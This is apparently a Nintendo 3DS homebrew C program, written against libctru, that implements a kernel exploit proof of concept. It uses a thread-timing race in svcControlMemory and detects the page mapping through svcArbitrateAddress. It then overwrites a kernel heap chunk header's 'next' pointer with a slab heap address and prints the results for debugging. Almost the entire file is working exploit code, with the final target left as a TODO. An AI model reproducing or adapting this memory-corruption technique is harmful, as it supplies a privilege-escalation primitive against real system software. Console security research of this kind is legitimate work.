#include <3ds.h>

#include <stdio.h>

#define SLAB_HEAP 0xFFF70000
#define PAGE_SIZE 0x1000

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;

static u32 memAddr = 0;
static u32 memSize = 0;

static Result control_res = -1;

// Thread function to slow down svcControlMemory execution.
void delay_thread(void* arg) {
    while(control_res == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
void allocate_thread(void* arg) {
    u32 tmp;
    control_res = svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
}

// Maps pages with chunk headers present.
void map_raw_pages(u32 memAddr, u32 memSize) {
    Handle arbiter = __sync_get_arbiter();

    // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
    threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
    // Create thread to allocate pages.
    threadCreate(allocate_thread, NULL, 0x4000, 0x3F, 1, true);

    // Use svcArbitrateAddress to detect when the memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
}

// Executes exploit.
void do_hax() {
    // Prepare necessary info.
    memAddr = __ctru_heap + __ctru_heap_size;
    memSize = PAGE_SIZE * 2;

    // Map the pages.
    map_raw_pages(memAddr, memSize);

    // Retrieve the current header data.
    u32 size = *(vu32*) (memAddr);
    u32 next = *(vu32*) (memAddr + 4);
    u32 prev = *(vu32*) (memAddr + 8);

    // Overwrite the header "next" pointer.
    *(u32*) (memAddr + 4) = SLAB_HEAP; // TODO: destination

    // Output debug information.
    printf("\"Size\" value: %08X\n", (int) size);
    printf("\"Next\" value: %08X\n", (int) next);
    printf("\"Prev\" value: %08X\n", (int) prev);

    printf("Post-overwrite control result: %08X\n", (int) control_res);
    while(control_res == -1) {
        svcSleepThread(1000000);
    }

    printf("Final control result: %08X\n", (int) control_res);

    // Free the allocated pages.
    u32 tmp;
    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
}

int main(int argc, char **argv) {
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);

    // Allow threads on core 1.
    aptOpenSession();
    APT_SetAppCpuTimeLimit(30);
    aptCloseSession();

    do_hax();

    printf("Press START to exit.\n");

    while(aptMainLoop()) {
        hidScanInput();
        if(hidKeysDown() & KEY_START) {
            break;
        }

        gfxFlushBuffers();
        gfxSwapBuffers();
        gspWaitForVBlank();
    }

    gfxExit();
    return 0;
}
